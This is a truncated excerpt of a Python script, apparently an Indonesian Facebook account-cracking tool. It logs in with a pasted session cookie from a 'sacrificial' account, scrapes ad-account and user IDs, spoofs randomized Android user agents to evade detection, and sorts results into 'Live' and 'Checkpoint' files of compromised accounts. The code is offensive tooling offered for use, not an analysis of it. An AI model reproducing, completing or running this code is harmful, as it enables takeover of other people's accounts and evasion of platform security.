...
###-----[ LOGIN COOKIES ]-----###
def login():
	print(f"\n{U}  - masukan cookie anda, disarankan menggunakan akun tumbal. {U}")
	cok = input(f'  - cookies : {H}')
	try:
		head = {"User-Agent": "Mozilla/5.0 (Linux; Android {str(random.randint(3,15))}; {device2}{str(random.randint(1000,10000))}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(random.randint(40,114))}.0.{str(random.randint(2200,4200))}.{str(random.randint(40,140))} Mobile Safari/537.36"}
		link = ses.get("https://web.facebook.com/adsmanager?_rdc=1&_rdr", headers=head, cookies={"cookie": cok})
		find = re.findall('act=(.*?)&nav_source', link.text)
		if len(find) == 0:print(f'{K}  - cookie kamu invalid silahkan menggunakan tumbal/cookies lain.');time.sleep(2);exit()
		else:
			for x in find:
...
def menu():
	...
	try:
		...
		exit(f"\n{U}  - Tidak ada koneksi{U}")
	except KeyError:
		try:os.remove(".cok.txt");os.remove(".tok.txt")
		except:pass
		print(f"\n{K}  - sepertinya akun tumbal mu terkena checkpoint...{K}");time.sleep(2)
		banner()
		os.system('clear')
...
def dump(idt,fields,cookie,token):
	try:
		headers = {
			...
			"user-agent": "Mozilla/5.0 (Linux; Android {str(random.randint(3,15))}; {device2}{str(random.randint(1000,10000))}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(random.randint(40,114))}.0.{str(random.randint(2200,4200))}.{str(random.randint(40,140))} Mobile Safari/537.36",
...
def Otomatis():
	...
	print(f"""
>>> {U}hasil Live akan tersimpan di : {H}Live/{okc}{U}
>>> {U}hasil Chek akan tersimpan di : {K}Chek/{cpc}{U}
...
def ugen():
  ...
  asep4 = f"Mozilla/5.0 (Linux; Android 9; Oppo A1k) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36"
  return rc([asep4])
